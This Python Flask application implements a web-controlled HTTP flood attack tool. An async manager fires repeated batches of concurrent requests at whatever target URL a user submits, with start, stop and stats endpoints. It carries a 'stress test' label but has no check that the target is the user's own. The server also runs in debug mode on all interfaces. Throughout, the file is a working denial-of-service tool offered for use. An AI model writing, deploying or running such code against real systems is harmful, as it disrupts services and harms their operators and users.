#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify, session
import asyncio
import aiohttp
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
app.secret_key = 'stress_test_secret_key'

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.stats = {}
        
    async def http_attack(self, target, attack_id, duration=60, workers=100):
        """HTTP Flood Attack"""
        start_time = time.time()
        request_count = 0
        success_count = 0
        
        async with aiohttp.ClientSession() as session:
            while time.time() - start_time < duration and self.active_attacks.get(attack_id, False):
                try:
                    tasks = []
                    for _ in range(workers):
                        task = session.get(target, timeout=5, ssl=False)
                        tasks.append(task)
                    
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for response in responses:
                        request_count += 1
                        if not isinstance(response, Exception):
                            success_count += 1
                            
                    # Update stats
                    self.stats[attack_id] = {
                        'requests': request_count,
                        'success': success_count,
                        'rps': request_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0,
                        'duration': time.time() - start_time
                    }
                    
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    continue
        
        # Cleanup
        if attack_id in self.active_attacks:
            del self.active_attacks[attack_id]
        if attack_id in self.stats:
            del self.stats[attack_id]

attack_manager = AttackManager()

def run_async_attack(target, attack_id, duration, workers):
    """Run async attack in thread"""
    asyncio.run(attack_manager.http_attack(target, attack_id, duration, workers))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target = data['target']
    duration = int(data['duration'])
    workers = int(data['workers'])
    
    attack_id = f"attack_{int(time.time())}_{random.randint(1000, 9999)}"
    attack_manager.active_attacks[attack_id] = True
    
    # Start attack in background thread
    thread = threading.Thread(
        target=run_async_attack,
        args=(target, attack_id, duration, workers)
    )
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'started',
        'attack_id': attack_id,
        'message': f'Attack started with {workers} workers for {duration} seconds'
    })

@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    data = request.json
    attack_id = data['attack_id']
    
    if attack_id in attack_manager.active_attacks:
        attack_manager.active_attacks[attack_id] = False
        return jsonify({'status': 'stopped', 'message': 'Attack stopped'})
    else:
        return jsonify({'status': 'error', 'message': 'Attack not found'})

@app.route('/api/stats')
def get_stats():
    return jsonify(attack_manager.stats)

@app.route('/api/active_attacks')
def get_active_attacks():
    active = {aid: 'running' for aid, status in attack_manager.active_attacks.items() if status}
    return jsonify(active)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
